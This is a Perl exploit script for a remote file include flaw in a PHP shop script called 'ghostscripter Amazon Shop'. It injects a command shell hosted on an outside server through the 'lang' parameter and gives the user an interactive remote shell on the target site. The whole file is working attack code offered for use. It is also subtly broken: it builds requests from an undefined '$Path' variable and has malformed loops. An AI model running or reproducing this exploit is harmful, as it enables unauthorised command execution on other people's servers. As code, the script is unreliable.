#!/usr/bin/perl
#
#ghostscripter Amazon Shop Remote File Include Exploit
#Script :http://ghostscripter.com/amazon_shop.php
#Original Advisory:http://www.milw0rm.com/exploits/8145
#By d3b4g
#Mail:bl4ckend [at]gmail.com
#


use LWP::UserAgent;

$my_Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];

if($my_Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}

head();

while()
{
       print "[shell] \$";
while(<STDIN>)
       {
               $cmd=$_;
               chomp($cmd);

$sploit = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'index.php?lang='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";

$res = $sploit->request($req);
$return = $res->content;
$return =~ tr/[\n]/[....]/;

if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a that command in <b>/)
       {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}

if($return =~ /(.*)/)


{
       $lolreturn = $1;
       $lolreturn=~ tr/[....]/[\n]/;
       print "\r\n$lolreturn\n\r";
       last;
}

else {print "[shell] \$";}}}last;

sub head()
 {
 print "\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
 print " ghostscripter Amazon Shop Remote File Include Exploit\r\n";
 print "                        Exploited by d3b4g\r\n";
 print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
 }
sub usage()
 {
 head();
 print " Usage: Amazon Shop.pl [target] [cmd shell location] [cmd shell variable]\r\n\n";
 print " <Site> - Full path to Amazon Shop script ex: http://www.site.com/ \r\n";
 print " <cmd shell> - Path to cmd Shell ex. http://www.shellzsite.com/cmd.txt \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print "---------------------------------------------------------------------------\r\n";
 print "                           By bl4ckend[at]Gmail.com \r\n";                         
 print "---------------------------------------------------------------------------\r\n";
 exit();
 }